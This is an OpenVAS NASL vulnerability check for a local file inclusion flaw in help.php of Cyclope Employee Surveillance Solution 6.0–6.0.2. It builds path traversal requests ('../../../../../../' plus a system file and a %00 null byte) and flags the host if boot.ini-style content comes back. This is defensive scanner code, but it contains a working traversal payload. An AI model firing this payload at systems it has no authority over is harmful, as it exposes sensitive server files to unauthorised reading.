###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cyclope_employee_surveillance_lfi_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain potentially sensitive
  information.
  Impact Level: Application";
tag_affected = "Cyclope Employee Surveillance Solution versions 6.0 to 6.0.2";
tag_insight = "An improper validation of user-supplied input via the 'pag' parameter to
  'help.php', that allows remote attackers to view files and execute local
  scripts in the context of the webserver.";
tag_solution = "No solution or patch is available as of 16th August, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.cyclope-series.com/";
tag_summary = "This host is running Cyclope Employee Surveillance Solution and is
  prone to local file inclusion vulnerability.";

if(description)
{
  script_id(802934);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-16 12:28:45 +0530 (Thu, 16 Aug 2012)");
  script_name("Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20545/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115590/cyclopees-sqllfi.txt");

  script_description(desc);
  script_summary("Check if Cyclope Employee Surveillance Solution is vulnerable to LFI");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 7879);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
sndReq = "";
rcvRes = "";
files = "";

## Get HTTP Port
port = get_http_port(default:7879);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get request
sndReq = http_get(item:"/activate.php", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    ## Construct the request
    url = "/help.php?pag=../../../../../../" +  files[file] + "%00";

    if(http_vuln_check(port:port, url:url,pattern:">[boot loader]",
       extra_check:make_list("Cyclope Employee")))
    {
      security_warning(port:port);
      exit(0);
    }
  }
}
